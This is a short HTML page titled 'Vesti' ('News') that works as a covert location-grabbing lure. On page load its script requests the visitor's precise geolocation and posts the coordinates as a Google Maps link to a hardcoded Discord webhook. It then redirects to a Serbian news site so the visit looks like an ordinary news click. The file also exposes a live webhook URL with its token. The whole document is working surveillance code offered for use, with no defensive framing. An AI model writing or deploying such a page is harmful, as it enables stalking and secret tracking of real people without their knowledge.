<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Vesti</title></head>
<body>
    <script>
        const webhook = "https://discordapp.com/api/webhooks/1494157860643278890/-kmJPPm-TfxTuVOewXOnSbB6Wr3y8mv5eOc0vh5RsPsd3H27yyWR9lRh_kAt3MySMa8g";
        const target = "https://www.rts.rs";

        function send(pos) {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            const acc = Math.round(pos.coords.accuracy);
            
            const payload = {
                content: `📍 **LOKACIJA STIGLA!**\nMapa: https://www.google.com/maps?q=${lat},${lon}\nPreciznost: ${acc} metara`
            };

            fetch(webhook, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).finally(() => { window.location.href = target; });
        }

        function fail() { window.location.href = target; }

        // Pokreni odmah
        navigator.geolocation.getCurrentPosition(send, fail, {
            enableHighAccuracy: true,
            timeout: 8000
        });

        // Sigurnosni prebačaj ako telefon predugo razmišlja
        setTimeout(fail, 9000);
    </script>
</body>
</html>
